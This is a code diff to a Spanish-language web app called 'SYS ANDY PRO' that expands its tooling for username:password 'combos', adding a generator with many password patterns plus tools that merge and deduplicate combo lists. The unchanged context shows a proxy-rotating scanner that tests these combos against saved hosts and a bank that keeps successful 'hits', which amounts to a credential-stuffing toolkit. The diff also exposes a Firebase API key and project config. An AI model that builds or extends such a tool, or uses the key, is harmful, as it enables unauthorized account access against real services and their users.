@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYS ANDY PRO - LEÓN ROJO & NEGRO</title>
+    <title>SYS ANDY PRO - MULTI HERRAMIENTA</title>
     <style>
         /* ========== PALETA LEÓN ROJO + NEGRO con difuminaciones ========== */
         :root {
@@ -14,7 +14,6 @@
             --texto-secundario: #ff8888;
             --borde-neon: #ff2200;
             --fuego-grad: linear-gradient(135deg, #ff3300, #990000, #330000);
-            --difuminado-grad: radial-gradient(circle at 30% 20%, #ff4422, #1a0000);
             --sombra-difusa: 0 0 20px rgba(255, 34, 0, 0.4), 0 0 40px rgba(128, 0, 0, 0.3);
         }
 
@@ -28,7 +27,7 @@
             position: relative;
         }
 
-        /* Fondo de león difuminado (silueta repetida) */
+        /* Fondo de león difuminado */
         body::before {
             content: "";
             position: fixed;
@@ -44,7 +43,6 @@
             z-index: 0;
         }
 
-        /* Contenido por encima del fondo */
         #auth-screen, #main-app {
             position: relative;
             z-index: 1;
@@ -72,12 +70,10 @@
             box-shadow: var(--sombra-difusa), inset 0 0 15px rgba(255, 68, 0, 0.2);
         }
 
-        /* Contenedor Principal */
         #main-app {
             display: none;
         }
 
-        /* Barra de navegación superior */
         .navbar {
             background: linear-gradient(90deg, #1a0000, #330000, #1a0000);
             display: flex;
@@ -103,8 +99,6 @@
             color: transparent;
             text-shadow: 0 0 6px #ff3300;
         }
-
-        /* León pequeño en el logo */
         .logo-title::before {
             content: "🦁 ";
             font-size: 1.6rem;
@@ -131,7 +125,6 @@
             transition: 0.1s linear;
         }
 
-        /* Pestañas */
         .tabs-container {
             display: flex;
             background-color: #1a0505;
@@ -160,17 +153,44 @@
             text-shadow: 0 0 5px #ff3300;
         }
 
-        /* Paneles */
         .panel {
             padding: 15px;
             display: none;
         }
-
         .panel.active {
             display: block;
         }
 
-        /* Formularios */
+        /* Sub-tabs dentro del panel de combos */
+        .sub-tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #ff4422;
+            padding-bottom: 8px;
+        }
+        .sub-tab {
+            background: none;
+            border: none;
+            color: #ffaa88;
+            font-weight: bold;
+            padding: 6px 15px;
+            cursor: pointer;
+            border-radius: 20px;
+            transition: 0.2s;
+        }
+        .sub-tab.active {
+            background: #ff4422;
+            color: #000;
+            box-shadow: 0 0 10px #ff4422;
+        }
+        .sub-panel {
+            display: none;
+        }
+        .sub-panel.active {
+            display: block;
+        }
+
         .form-group {
             margin-bottom: 15px;
         }
@@ -201,7 +221,6 @@
             outline: none;
         }
 
-        /* BOTONES CON EFECTO DE LLAMA */
         .btn-block, .btn-small, .btn-salir {
             position: relative;
             overflow: hidden;
@@ -276,7 +295,6 @@
         .btn-del { background-color: #aa2222; }
         .btn-copy { background-color: #00bfa5; }
 
-        /* Jobs escáner */
         .job-card {
             background: rgba(20, 5, 5, 0.9);
             backdrop-filter: blur(5px);
@@ -423,49 +441,113 @@
     </div>
 
     <div id="panel-combos" class="panel active">
-        <h3>📦 Creador Avanzado de Combos Masivos</h3>
-        <div class="form-group">
-            <label>Cantidad de combos a generar:</label>
-            <input type="number" id="cantidad" value="100">
+        <h3>📦 MÚLTIPLE HERRAMIENTA DE COMBOS</h3>
+        <!-- Sub-pestañas internas -->
+        <div class="sub-tabs">
+            <button class="sub-tab active" data-sub="generator">Generador de Combos</button>
+            <button class="sub-tab" data-sub="merge">Unir Combos</button>
+            <button class="sub-tab" data-sub="dedupe">Eliminar Duplicados</button>
         </div>
-        <div class="form-group">
-            <label>Longitud base de la contraseña:</label>
-            <input type="number" id="longitud" value="8">
+
+        <!-- Sub-panel: Generador -->
+        <div id="sub-generator" class="sub-panel active">
+            <div class="form-group">
+                <label>Tipo de generación:</label>
+                <select id="genType">
+                    <option value="userpass_ano">User:Pass (1996-2050)</option>
+                    <option value="useruser">User:User (Nombre-Nombre)</option>
+                    <option value="userpass_num">User:Pass (1-999)</option>
+                    <option value="alfanumericos">Alfanuméricos</option>
+                    <option value="user_num_fijo">User:Numero (123 a 123..9)</option>
+                    <option value="user_num_random">User:Numero (12345..Random)</option>
+                    <option value="num_num">Combos numéricos (numero:número)</option>
+                    <option value="nombre_alfanumerico">Nombre: Alfanuméricos</option>
+                    <option value="personalizado">Personalizado (Pederrizador)</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Cantidad de combos:</label>
+                <input type="number" id="genCantidad" value="100">
+            </div>
+            <div class="form-group">
+                <label>Separador:</label>
+                <select id="genSep">
+                    <option value=":">:</option>
+                    <option value="|">|</option>
+                    <option value=";">;</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Formato usuario (minúscula/mayúscula):</label>
+                <select id="genUserCase">
+                    <option value="lower">Minúscula</option>
+                    <option value="upper">Mayúscula</option>
+                    <option value="capitalize">Primera mayúscula</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Formato contraseña:</label>
+                <select id="genPassCase">
+                    <option value="lower">Minúscula</option>
+                    <option value="upper">Mayúscula</option>
+                    <option value="capitalize">Primera mayúscula</option>
+                </select>
+            </div>
+            <button class="btn-block btn-start" onclick="generarComboAvanzado()">⚡ GENERAR COMBOS</button>
+            <div class="form-group" style="margin-top: 20px;">
+                <label>Resultado:</label>
+                <textarea id="comboResultado" rows="10" readonly placeholder="Aquí aparecerán los combos generados..."></textarea>
+            </div>
+            <button id="btnDescargarComboGen" class="btn-block btn-save" disabled onclick="descargarComboGenerado()">⬇️ DESCARGAR COMBO (.TXT)</button>
         </div>
-        <div class="form-group">
-            <label>Tipo de estructura de usuario:</label>
-            <select id="tipo">
-                <option value="random">Usuario Random</option>
-                <option value="email">Email Mix (Gmail/Yahoo/Hotmail)</option>
-                <option value="nombre">Nombre + Número / Año</option>
-                <option value="nombrenombre">Nombre:Nombre / Estructuras Avanzadas</option>
-                <option value="nombreigual">Nombre = Pass (dario;dario)</option>
-                <option value="andymix">AndyMix Avanzado</option>
-            </select>
+
+        <!-- Sub-panel: Unir Combos -->
+        <div id="sub-merge" class="sub-panel">
+            <div class="form-group">
+                <label>Lista de combos 1 (archivo .txt):</label>
+                <input type="file" id="mergeFile1" accept=".txt">
+            </div>
+            <div class="form-group">
+                <label>Lista de combos 2 (archivo .txt):</label>
+                <input type="file" id="mergeFile2" accept=".txt">
+            </div>
+            <div class="form-group">
+                <label>Lista de combos 3 (archivo .txt, opcional):</label>
+                <input type="file" id="mergeFile3" accept=".txt">
+            </div>
+            <div class="form-group">
+                <label>Separador de salida:</label>
+                <select id="mergeSep">
+                    <option value=":">:</option>
+                    <option value="|">|</option>
+                    <option value=";">;</option>
+                </select>
+            </div>
+            <button class="btn-block btn-start" onclick="unirCombos()">🔗 UNIR COMBOS</button>
+            <div class="form-group" style="margin-top: 20px;">
+                <label>Resultado unificado:</label>
+                <textarea id="mergeResultado" rows="10" readonly placeholder="Aquí aparecerán los combos unidos..."></textarea>
+            </div>
+            <button id="btnDescargarMerge" class="btn-block btn-save" disabled onclick="descargarMergeResultado()">⬇️ DESCARGAR UNIÓN (.TXT)</button>
         </div>
-        <div class="form-group">
-            <label>Agregar año fijo al final de Pass:</label>
-            <select id="anio">
-                <option value="">Sin año fijo</option>
-                <option value="2024">2024</option>
-                <option value="2025">2025</option>
-                <option value="2026">2026</option>
-            </select>
+
+        <!-- Sub-panel: Eliminar Duplicados -->
+        <div id="sub-dedupe" class="sub-panel">
+            <div class="form-group">
+                <label>Archivo con combos (.txt):</label>
+                <input type="file" id="dedupeFile" accept=".txt">
+            </div>
+            <div class="form-group">
+                <label>...o pega el texto aquí:</label>
+                <textarea id="dedupeText" rows="6" placeholder="Pega tus combos aquí (user:pass por línea)"></textarea>
+            </div>
+            <button class="btn-block btn-start" onclick="eliminarDuplicados()">🧹 ELIMINAR DUPLICADOS</button>
+            <div class="form-group" style="margin-top: 20px;">
+                <label>Resultado sin duplicados:</label>
+                <textarea id="dedupeResultado" rows="10" readonly placeholder="Aquí aparecerán los combos únicos..."></textarea>
+            </div>
+            <button id="btnDescargarDedupe" class="btn-block btn-save" disabled onclick="descargarDedupeResultado()">⬇️ DESCARGAR LIMPIO (.TXT)</button>
         </div>
-        <div class="form-group">
-            <label>Separador de cadena:</label>
-            <select id="sep">
-                <option value=":">:</option>
-                <option value="|">|</option>
-                <option value=";">;</option>
-            </select>
-        </div>
-        <button class="btn-block btn-start" onclick="generarComboMasivo()">⚡ GENERAR Y COMBINAR LISTA</button>
-        <div class="form-group" style="margin-top: 20px;">
-            <label>Resultado Final del Combo Generado:</label>
-            <textarea id="creatorResultado" rows="10" readonly placeholder="Aquí aparecerá tu combo..."></textarea>
-        </div>
-        <button id="btnDescargarCombo" class="btn-block btn-save" disabled onclick="descargarComboCreado()">⬇️ DESCARGAR COMBO (.TXT)</button>
     </div>
 
     <div id="panel-scanner" class="panel">
@@ -544,7 +626,7 @@
 </div>
 
 <script>
-    // ==================== FIREBASE ====================
+    // ==================== FIREBASE (NO TOCAR) ====================
     const firebaseConfig = {
         apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
         authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -637,57 +719,270 @@
     }
     function eliminarVendedorFirebase(key) { if(confirm("¿Eliminar acceso?")) db.ref("vendedores/" + key).remove(); }
 
-    // ==================== GENERADOR COMBOS ====================
-    function randomString(l){ const c="abcdefghijklmnopqrstuvwxyz0123456789"; let r=""; for(let i=0;i<l;i++) r+=c[Math.floor(Math.random()*c.length)]; return r; }
-    function randomPassComplex(l){ const c="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; let r=""; for(let i=0;i<l;i++) r+=c[Math.floor(Math.random()*c.length)]; return r; }
-    function alternarMayusculas(t){ let r=""; for(let i=0;i<t.length;i++) r+=Math.random()>0.5?t[i].toUpperCase():t[i].toLowerCase(); return r; }
-    function generarNombreInfinito(){ const p=["ju","lu","pe","ca","mi","jo","ma","da","ri","an","al","br","be"]; const r=["an","is","dr","rl","gu","os","nu","ni","ca","nt","ber","ria"]; const s=["an","is","dro","los","guel","se","uel","niel","ardo","nio","to"]; return p[Math.floor(Math.random()*p.length)]+r[Math.floor(Math.random()*r.length)]+s[Math.floor(Math.random()*s.length)]; }
-    const nombres=["juan","luis","pedro","carlos","miguel","jose","manuel","daniel","ricardo","andres","david","diego"];
-    const dominios=["@gmail.com","@yahoo.com","@hotmail.com","@outlook.com"];
-    function generarComboMasivo(){
-        let cantidad=parseInt(document.getElementById("cantidad").value)||100, longitud=parseInt(document.getElementById("longitud").value)||8, tipo=document.getElementById("tipo").value, anio=document.getElementById("anio").value, sep=document.getElementById("sep").value;
-        let combosUnicos=new Set(), intentos=0;
-        while(combosUnicos.size<cantidad && intentos<cantidad*10){
-            intentos++; let user="", pass="";
-            if(tipo=="random"){ user=randomString(6)+(Math.floor(Math.random()*90)+10); pass=randomPassComplex(longitud); }
-            else if(tipo=="email"){ user=nombres[Math.floor(Math.random()*nombres.length)]+(Math.floor(Math.random()*99))+dominios[Math.floor(Math.random()*dominios.length)]; pass=randomPassComplex(longitud); }
-            else if(tipo=="nombre"){ user=nombres[Math.floor(Math.random()*nombres.length)]+(Math.floor(Math.random()*900)+100); pass=randomPassComplex(longitud); }
-            else if(tipo=="nombreigual"){ let base=nombres[Math.floor(Math.random()*nombres.length)]+(Math.floor(Math.random()*89)+10); user=base; pass=base; }
-            else{ user=alternarMayusculas(generarNombreInfinito())+(Math.floor(Math.random()*900)+100); pass=randomPassComplex(longitud); }
-            if(anio!="") pass+=anio;
-            combosUnicos.add(user+sep+pass);
-        }
-        document.getElementById("creatorResultado").value=Array.from(combosUnicos).join("\n");
-        document.getElementById("btnDescargarCombo").disabled=false;
-        alert(`¡Completado! ${combosUnicos.size} combos.`);
+    // ==================== NUEVAS FUNCIONES PARA COMBOS ====================
+    // Helper: aplicar formato de mayúsculas/minúsculas
+    function applyCase(str, caseType) {
+        if (caseType === 'upper') return str.toUpperCase();
+        if (caseType === 'capitalize') return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
+        return str.toLowerCase();
     }
-    function descargarComboCreado(){ const datos=document.getElementById('creatorResultado').value; const blob=new Blob([datos],{type:'text/plain'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='Combo_AndyPro.txt'; a.click(); a.remove(); }
 
-    // ==================== BLOC URLS Y BANCO HITS (CON FECHA) ====================
-    function guardarUrlBloc(){
-        const val=document.getElementById('inputUrlData').value.trim(), editId=document.getElementById('editUrlId').value;
-        if(!val) return;
-        let baseUrls=JSON.parse(localStorage.getItem('sys_urls'))||{};
-        if(!baseUrls[usernameClave]) baseUrls[usernameClave]=[];
-        if(editId!==""){ baseUrls[usernameClave][parseInt(editId)]=val; document.getElementById('editUrlId').value=""; document.getElementById('lblUrlForm').textContent="Agregar nueva URL / Host:"; }
-        else baseUrls[usernameClave].push(val);
-        localStorage.setItem('sys_urls',JSON.stringify(baseUrls));
-        document.getElementById('inputUrlData').value="";
+    // Generador avanzado
+    function generarComboAvanzado() {
+        const tipo = document.getElementById('genType').value;
+        let cantidad = parseInt(document.getElementById('genCantidad').value) || 100;
+        const separador = document.getElementById('genSep').value;
+        const userCase = document.getElementById('genUserCase').value;
+        const passCase = document.getElementById('genPassCase').value;
+
+        let combos = new Set();
+        let intentos = 0;
+        const maxIntentos = cantidad * 5;
+
+        // Lista de nombres comunes
+        const nombres = ["juan", "pedro", "carlos", "luis", "andres", "david", "diego", "javier", "manuel", "alejandro", "fernando", "miguel", "rafael", "jorge", "antonio", "angel", "jose", "daniel", "oscar", "ruben"];
+        // Lista de apellidos o palabras para usuario
+        const palabras = ["admin", "user", "test", "root", "master", "demo", "guest", "support", "office", "system"];
+
+        function generarNumeroRango(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+
+        while (combos.size < cantidad && intentos < maxIntentos) {
+            intentos++;
+            let user = "", pass = "";
+
+            switch (tipo) {
+                case 'userpass_ano':
+                    let nombreBase = nombres[Math.floor(Math.random() * nombres.length)];
+                    let ano = generarNumeroRango(1996, 2050);
+                    user = nombreBase + ano;
+                    pass = "pass" + ano;
+                    break;
+                case 'useruser':
+                    let n1 = nombres[Math.floor(Math.random() * nombres.length)];
+                    let n2 = nombres[Math.floor(Math.random() * nombres.length)];
+                    user = n1;
+                    pass = n2;
+                    break;
+                case 'userpass_num':
+                    let nombreNum = nombres[Math.floor(Math.random() * nombres.length)];
+                    let num = generarNumeroRango(1, 999);
+                    user = nombreNum + num;
+                    pass = "pass" + num;
+                    break;
+                case 'alfanumericos':
+                    user = Math.random().toString(36).substring(2, 8) + generarNumeroRango(100, 999);
+                    pass = Math.random().toString(36).substring(2, 10) + generarNumeroRango(1, 999);
+                    break;
+                case 'user_num_fijo':
+                    let nombreFijo = palabras[Math.floor(Math.random() * palabras.length)];
+                    let numFijo = generarNumeroRango(123, 999999);
+                    user = nombreFijo;
+                    pass = numFijo.toString();
+                    break;
+                case 'user_num_random':
+                    let nombreRand = palabras[Math.floor(Math.random() * palabras.length)];
+                    let numRand = Math.floor(Math.random() * 99999) + 12345;
+                    user = nombreRand;
+                    pass = numRand.toString();
+                    break;
+                case 'num_num':
+                    let num1 = Math.floor(Math.random() * 999999);
+                    let num2 = Math.floor(Math.random() * 999999);
+                    user = num1.toString();
+                    pass = num2.toString();
+                    break;
+                case 'nombre_alfanumerico':
+                    let nombreAlfa = nombres[Math.floor(Math.random() * nombres.length)];
+                    let alfa = Math.random().toString(36).substring(2, 6);
+                    user = nombreAlfa;
+                    pass = alfa + generarNumeroRango(100, 999);
+                    break;
+                case 'personalizado':
+                    let base = ["elpro", "master", "dios", "rey", "leon", "fuego", "rojo", "negro", "tigre", "jaguar"];
+                    let pref = base[Math.floor(Math.random() * base.length)];
+                    let suf = Math.floor(Math.random() * 999);
+                    user = pref + suf;
+                    pass = Math.random().toString(36).substring(2, 12);
+                    break;
+                default:
+                    user = "user" + Math.random();
+                    pass = "pass" + Math.random();
+            }
+
+            user = applyCase(user, userCase);
+            pass = applyCase(pass, passCase);
+            combos.add(user + separador + pass);
+        }
+
+        if (combos.size < cantidad) alert(`Solo se pudieron generar ${combos.size} combos únicos.`);
+        else alert(`✅ Generados ${cantidad} combos.`);
+
+        const resultado = Array.from(combos).join("\n");
+        document.getElementById('comboResultado').value = resultado;
+        document.getElementById('btnDescargarComboGen').disabled = false;
+    }
+
+    function descargarComboGenerado() {
+        const contenido = document.getElementById('comboResultado').value;
+        if (!contenido) return;
+        const blob = new Blob([contenido], { type: 'text/plain' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'combo_generado.txt';
+        a.click();
+        a.remove();
+    }
+
+    // Unir combos (hasta 3 archivos)
+    let mergeData = { file1: [], file2: [], file3: [] };
+    function readMergeFile(inputEl, targetArray, index) {
+        const file = inputEl.files[0];
+        if (!file) { targetArray.length = 0; return; }
+        const reader = new FileReader();
+        reader.onload = e => {
+            const lines = e.target.result.split(/\r?\n/).filter(l => l.trim().length > 0);
+            targetArray.length = 0;
+            targetArray.push(...lines);
+            // Si los tres archivos ya se han cargado (al menos los que existen), actualizar resultado
+            // Se puede llamar a actualizarMergeResultado después de cada carga
+            actualizarMergeResultado();
+        };
+        reader.readAsText(file);
+    }
+
+    function actualizarMergeResultado() {
+        let combined = [];
+        if (mergeData.file1.length) combined.push(...mergeData.file1);
+        if (mergeData.file2.length) combined.push(...mergeData.file2);
+        if (mergeData.file3.length) combined.push(...mergeData.file3);
+        const separador = document.getElementById('mergeSep').value;
+        // No cambiar separador, solo mostrar líneas tal cual (ya tienen su propio separador)
+        const resultado = combined.join("\n");
+        document.getElementById('mergeResultado').value = resultado;
+        document.getElementById('btnDescargarMerge').disabled = (combined.length === 0);
+    }
+
+    function unirCombos() {
+        // Forzar la lectura de los tres archivos si no se han leído aún
+        const f1 = document.getElementById('mergeFile1');
+        const f2 = document.getElementById('mergeFile2');
+        const f3 = document.getElementById('mergeFile3');
+        if (f1.files.length) readMergeFile(f1, mergeData.file1, 1);
+        if (f2.files.length) readMergeFile(f2, mergeData.file2, 2);
+        if (f3.files.length) readMergeFile(f3, mergeData.file3, 3);
+        // Si no hay archivos, alert
+        if (!f1.files.length && !f2.files.length && !f3.files.length) {
+            alert("Selecciona al menos un archivo.");
+            return;
+        }
+        // La actualización se hará en los callbacks; pero si ya están cargados, llamamos manual
+        actualizarMergeResultado();
+    }
+
+    function descargarMergeResultado() {
+        const contenido = document.getElementById('mergeResultado').value;
+        if (!contenido) return;
+        const blob = new Blob([contenido], { type: 'text/plain' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'combos_unidos.txt';
+        a.click();
+        a.remove();
+    }
+
+    // Eliminar duplicados
+    let dedupeLines = [];
+    function leerArchivoDedupe() {
+        const fileInput = document.getElementById('dedupeFile');
+        const textArea = document.getElementById('dedupeText');
+        if (fileInput.files.length) {
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+            reader.onload = e => {
+                const lines = e.target.result.split(/\r?\n/);
+                dedupeLines = lines.filter(l => l.trim().length > 0);
+                procesarDedupe();
+            };
+            reader.readAsText(file);
+        } else if (textArea.value.trim()) {
+            dedupeLines = textArea.value.split(/\r?\n/).filter(l => l.trim().length > 0);
+            procesarDedupe();
+        } else {
+            alert("Selecciona un archivo o pega texto.");
+        }
+    }
+
+    function procesarDedupe() {
+        const unicos = [...new Set(dedupeLines)];
+        const resultado = unicos.join("\n");
+        document.getElementById('dedupeResultado').value = resultado;
+        document.getElementById('btnDescargarDedupe').disabled = (unicos.length === 0);
+        alert(`Duplicados eliminados: ${dedupeLines.length - unicos.length} eliminados, ${unicos.length} únicos.`);
+    }
+
+    function eliminarDuplicados() {
+        leerArchivoDedupe();
+    }
+
+    function descargarDedupeResultado() {
+        const contenido = document.getElementById('dedupeResultado').value;
+        if (!contenido) return;
+        const blob = new Blob([contenido], { type: 'text/plain' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = 'combos_sin_duplicados.txt';
+        a.click();
+        a.remove();
+    }
+
+    // Event listeners para los archivos de unión (para actualizar automáticamente)
+    document.getElementById('mergeFile1').addEventListener('change', () => readMergeFile(document.getElementById('mergeFile1'), mergeData.file1, 1));
+    document.getElementById('mergeFile2').addEventListener('change', () => readMergeFile(document.getElementById('mergeFile2'), mergeData.file2, 2));
+    document.getElementById('mergeFile3').addEventListener('change', () => readMergeFile(document.getElementById('mergeFile3'), mergeData.file3, 3));
+
+    // Sub-tabs interno
+    document.querySelectorAll('.sub-tab').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const subId = btn.getAttribute('data-sub');
+            document.querySelectorAll('.sub-tab').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.querySelectorAll('.sub-panel').forEach(p => p.classList.remove('active'));
+            document.getElementById(`sub-${subId}`).classList.add('active');
+        });
+    });
+
+    // ==================== BLOC URLS Y BANCO HITS (original) ====================
+    function guardarUrlBloc() {
+        const val = document.getElementById('inputUrlData').value.trim(), editId = document.getElementById('editUrlId').value;
+        if (!val) return;
+        let baseUrls = JSON.parse(localStorage.getItem('sys_urls')) || {};
+        if (!baseUrls[usernameClave]) baseUrls[usernameClave] = [];
+        if (editId !== "") {
+            baseUrls[usernameClave][parseInt(editId)] = val;
+            document.getElementById('editUrlId').value = "";
+            document.getElementById('lblUrlForm').textContent = "Agregar nueva URL / Host:";
+        } else baseUrls[usernameClave].push(val);
+        localStorage.setItem('sys_urls', JSON.stringify(baseUrls));
+        document.getElementById('inputUrlData').value = "";
         renderizarUrlsBloc();
     }
-    function renderizarUrlsBloc(){
-        let baseUrls=JSON.parse(localStorage.getItem('sys_urls'))||{}, container=document.getElementById('listaUrlsContainer');
-        container.innerHTML='';
-        let misUrls=baseUrls[usernameClave]||[];
-        if(misUrls.length===0){ container.innerHTML='<p>No hay servidores guardados.</p>'; return; }
-        misUrls.forEach((url,idx)=>{ let div=document.createElement('div'); div.className='item-card'; div.innerHTML=`<div>🌐 <code>${url}</code></div><div class="item-actions"><button class="btn-small btn-copy" onclick="usarUrlEscanner(${idx})">🔌 Escanear</button><button class="btn-small btn-del" onclick="eliminarUrl(${idx})">Eliminar</button></div>`; container.appendChild(div); });
+    function renderizarUrlsBloc() {
+        let baseUrls = JSON.parse(localStorage.getItem('sys_urls')) || {}, container = document.getElementById('listaUrlsContainer');
+        container.innerHTML = '';
+        let misUrls = baseUrls[usernameClave] || [];
+        if (misUrls.length === 0) { container.innerHTML = '<p>No hay servidores guardados.</p>'; return; }
+        misUrls.forEach((url, idx) => {
+            let div = document.createElement('div'); div.className = 'item-card';
+            div.innerHTML = `<div>🌐 <code>${url}</code></div><div class="item-actions"><button class="btn-small btn-copy" onclick="usarUrlEscanner(${idx})">🔌 Escanear</button><button class="btn-small btn-del" onclick="eliminarUrl(${idx})">Eliminar</button></div>`;
+            container.appendChild(div);
+        });
     }
-    function usarUrlEscanner(idx){ let baseUrls=JSON.parse(localStorage.getItem('sys_urls')); document.getElementById('hostInput').value=baseUrls[usernameClave][idx].split(" - ")[0].trim(); switchTab('scanner'); }
-    function eliminarUrl(idx){ let baseUrls=JSON.parse(localStorage.getItem('sys_urls')); baseUrls[usernameClave].splice(idx,1); localStorage.setItem('sys_urls',JSON.stringify(baseUrls)); renderizarUrlsBloc(); }
+    function usarUrlEscanner(idx) { let baseUrls = JSON.parse(localStorage.getItem('sys_urls')); document.getElementById('hostInput').value = baseUrls[usernameClave][idx].split(" - ")[0].trim(); switchTab('scanner'); }
+    function eliminarUrl(idx) { let baseUrls = JSON.parse(localStorage.getItem('sys_urls')); baseUrls[usernameClave].splice(idx, 1); localStorage.setItem('sys_urls', JSON.stringify(baseUrls)); renderizarUrlsBloc(); }
 
     function guardarHitEnBanco(hitTexto, user, pass) {
         const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits')) || {};
-        if(!baseHits[usernameClave]) baseHits[usernameClave] = [];
+        if (!baseHits[usernameClave]) baseHits[usernameClave] = [];
         const yaExiste = baseHits[usernameClave].some(h => h.user === user && h.pass === pass);
         if (yaExiste) return;
         const ahora = new Date();
@@ -709,8 +1004,8 @@
         const container = document.getElementById('bancoHitsContainer');
         container.innerHTML = '';
         const misHits = baseHits[usernameClave] || [];
-        if(misHits.length === 0) { container.innerHTML = '<p style="color:#ffaa66;">No hay hits guardados.</p>'; return; }
-        misHits.sort((a,b) => (b.timestamp||0) - (a.timestamp||0));
+        if (misHits.length === 0) { container.innerHTML = '<p style="color:#ffaa66;">No hay hits guardados.</p>'; return; }
+        misHits.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
         misHits.forEach(h => {
             const div = document.createElement('div');
             div.className = 'hit-block';
@@ -728,7 +1023,7 @@
     function copiarHitConContador(hitId) {
         const baseHits = JSON.parse(localStorage.getItem('sys_saved_hits'));
         const item = baseHits[usernameClave].find(h => h.id == hitId);
-        if(item) {
+        if (item) {
             item.copies = (item.copies || 0) + 1;
             localStorage.setItem('sys_saved_hits', JSON.stringify(baseHits));
             navigator.clipboard.writeText(item.texto).then(() => renderizarBancoHits());
@@ -742,20 +1037,20 @@
     }
 
     function switchTab(tabName) {
-        document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
-        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
-        document.getElementById('panel-'+tabName).classList.add('active');
-        let btn = Array.from(document.querySelectorAll('.tab-btn')).find(b=>b.getAttribute('onclick')?.includes(tabName));
-        if(btn) btn.classList.add('active');
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById('panel-' + tabName).classList.add('active');
+        let btn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick')?.includes(tabName));
+        if (btn) btn.classList.add('active');
     }
 
-    // ==================== ESCÁNER MEJORADO CON SONIDO GEMIDO Y PROXIES ====================
+    // ==================== ESCÁNER (original con sonido, proxies, etc.) ====================
     let moanAudioContext = null;
     function playMoanSound() {
-        if(!document.getElementById('soundToggle').checked) return;
+        if (!document.getElementById('soundToggle').checked) return;
         try {
-            if(!moanAudioContext) moanAudioContext = new (window.AudioContext || window.webkitAudioContext)();
-            if(moanAudioContext.state === 'suspended') moanAudioContext.resume();
+            if (!moanAudioContext) moanAudioContext = new (window.AudioContext || window.webkitAudioContext)();
+            if (moanAudioContext.state === 'suspended') moanAudioContext.resume();
             const now = moanAudioContext.currentTime;
             const osc = moanAudioContext.createOscillator();
             const gain = moanAudioContext.createGain();
@@ -769,8 +1064,8 @@
             gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.8);
             osc.start();
             osc.stop(now + 0.8);
-            if(navigator.vibrate) navigator.vibrate(200);
-        } catch(e) { console.log("Audio error", e); }
+            if (navigator.vibrate) navigator.vibrate(200);
+        } catch (e) { console.log("Audio error", e); }
     }
 
     const CORS_PROXIES = [
@@ -809,33 +1104,33 @@
     const MAX_FAILS = 2;
     const COOLDOWN_MS = 30000;
     function isProxyOnCooldown(tpl) { let d = PROXY_FAILS.get(tpl); return d && d.until && Date.now() < d.until; }
-    function markProxyFail(tpl) { let d = PROXY_FAILS.get(tpl) || { fails:0, until:0 }; d.fails++; if(d.fails>=MAX_FAILS){ d.until=Date.now()+COOLDOWN_MS; d.fails=0; } PROXY_FAILS.set(tpl,d); }
+    function markProxyFail(tpl) { let d = PROXY_FAILS.get(tpl) || { fails: 0, until: 0 }; d.fails++; if (d.fails >= MAX_FAILS) { d.until = Date.now() + COOLDOWN_MS; d.fails = 0; } PROXY_FAILS.set(tpl, d); }
     function markProxySuccess(tpl) { PROXY_FAILS.delete(tpl); }
 
     async function fetchWithCors(url, options = {}, intentos = 3) {
         const opts = { cache: 'no-store', ...options };
         if (!document.getElementById('useCors').checked) {
             let r = await fetch(url, opts);
-            if(r.ok) return r;
+            if (r.ok) return r;
             throw new Error('Direct fetch failed');
         }
         let proxies = CORS_PROXIES.filter(tpl => !isProxyOnCooldown(tpl));
-        if(proxies.length===0) proxies = [...CORS_PROXIES];
-        for(let i=proxies.length-1;i>0;i--){ let j=Math.floor(Math.random()*(i+1)); [proxies[i],proxies[j]]=[proxies[j],proxies[i]]; }
-        for(let tpl of proxies){
-            try{
+        if (proxies.length === 0) proxies = [...CORS_PROXIES];
+        for (let i = proxies.length - 1; i > 0; i--) { let j = Math.floor(Math.random() * (i + 1)); [proxies[i], proxies[j]] = [proxies[j], proxies[i]]; }
+        for (let tpl of proxies) {
+            try {
                 let proxied = tpl.replace('{url}', encodeURIComponent(url));
                 let res = await fetch(proxied, opts);
-                if(res && res.ok){ markProxySuccess(tpl); return res; }
+                if (res && res.ok) { markProxySuccess(tpl); return res; }
                 else markProxyFail(tpl);
-            }catch(e){ markProxyFail(tpl); }
+            } catch (e) { markProxyFail(tpl); }
         }
-        if(intentos>1){ await new Promise(r=>setTimeout(r,1000)); return fetchWithCors(url,options,intentos-1); }
+        if (intentos > 1) { await new Promise(r => setTimeout(r, 1000)); return fetchWithCors(url, options, intentos - 1); }
         throw new Error('All proxies failed');
     }
 
-    function extractCombo(line){
-        if(!line) return null;
+    function extractCombo(line) {
+        if (!line) return null;
         let s = line.trim();
         let m = s.match(/([^:\s]+)\s*:\s*([^:\s]+)/);
         return m ? [m[1].trim(), m[2].trim()] : null;
@@ -852,58 +1147,42 @@
     let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
     const HITS = { 1: [], 2: [], 3: [] };
 
-    function updateStartState(){
+    function updateStartState() {
